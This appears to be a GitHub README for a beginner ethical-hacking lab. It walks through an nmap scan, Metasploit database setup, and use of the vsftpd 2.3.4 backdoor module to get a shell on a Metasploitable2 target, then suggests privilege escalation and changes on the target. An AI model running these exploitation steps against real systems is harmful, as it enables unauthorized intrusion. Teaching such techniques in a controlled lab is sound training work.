# attack-simulation-ethical-hacking-
This repository explains what people mean when they talk about “hacking a system” or “running commands on a remote host” in the context of cybersecurity, and it teaches those concepts responsibly. It’s not a how-to for illegal activity — it’s a structured, legal learning path for students, defenders, and aspiring penetration testers.

**Legal & ethical notice (must read)**
All content in this repository is intended for educational use on systems you own or have explicit written permission to test. Unauthorized access to computers or networks is illegal. Do not use these techniques against third-party systems without a signed Rules of Engagement. Contributors must follow the repo’s Code of Conduct and the ethical guidelines.

**(1) Find the target ip addresss**
Make sure you get your target ip address available. i,m so sure that you most have gotten ready the ip you want to target. If you dont have, you can get one through metasploitable2 vm. Also, you can use your other ip device for save practise. NOTE!, for this tutorial, i will use 192.168.*.*

**(2) Service + version scan**
On your kali vm, run the command below to scan for open port, service, and version

nmap -sV -p- -A 192.168.*.*

https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-Linux/blob/0c842b0c2bdc5102831a7bf12bc7717a3b837b8c/Screenshot1.png


**(3) Run the command below to install mestasploit console**
sudo apt install --reinstall metasploit-framework -y

After installing metasploit, run the command below to lunch metasploit:

msfconsole


**(4)scan result to metasploit data base (DB)**
db_nmap -sV -p- 192.168.*.*

The above command will import the target scanned result to metasploit database. If the above command is not connecting, no connection, it means metasploit 
(postgresql) is not running. To fix it start "postgresql" by running the below command:

sudo systemctl start postgresql

https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-Linux/blob/0c842b0c2bdc5102831a7bf12bc7717a3b837b8c/Screenshot2.png

**(5) To initialize/create or check if its has been configured, run:**
sudo msfdb init

https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-Linux/blob/0c842b0c2bdc5102831a7bf12bc7717a3b837b8c/Screenshot3.png


**(6) Relunch your metasploit** 
Open a new terminal run the below command to relunch your metasploit console:

msfconsole

https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-Linux/blob/0c842b0c2bdc5102831a7bf12bc7717a3b837b8c/Screenshot4.png


**(7) Then run the command below to confirm your connection. You should see "connected to msf postgresql:**
db_status

https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-Linux/blob/0c842b0c2bdc5102831a7bf12bc7717a3b837b8c/Screenshot5.png


**(8)Then rerun the below command to import the target scanned result to metasploit database:**
db_nmap -sV -p- 192.168.*.*

https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-Linux/blob/0c842b0c2bdc5102831a7bf12bc7717a3b837b8c/Screenshot6.png


**(9)Note: We are using por21 ftp version vsftp as our backdoor to gain access to the targeted device/get a module. run:**

search vsftpd

https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-Linux/blob/0c842b0c2bdc5102831a7bf12bc7717a3b837b8c/Screenshot7.png


**(10)From the option below on the screenshot, choose 1. run:**
info 1

https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-Linux/blob/0c842b0c2bdc5102831a7bf12bc7717a3b837b8c/Screenshot8.png

run command:

use exploit/unix/ftp/vsftpd_234_backdoor

https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-Linux/blob/0c842b0c2bdc5102831a7bf12bc7717a3b837b8c/Screenshot9.png

run:
set RHOST 192.168.*.*

run:
set RPORT 21

run:
set PAYLOAD cmd/unix/interact

run:
show options

**(11)run:**
run

https://github.com/eigbejosh1234/attack-simulation-ethical-hacking-all-on-kali-Linux/blob/0c842b0c2bdc5102831a7bf12bc7717a3b837b8c/Screenshot10.png

When you check the last output you will noticed that we have gotten a shell. That means you are in your target device. You now have access to go through your target directories and escalate previledges. 

To confirm quickly run:
ifconfig
whoami
ls
and navigate round your target directories, modify edit and install to your target machine through the backdoor.
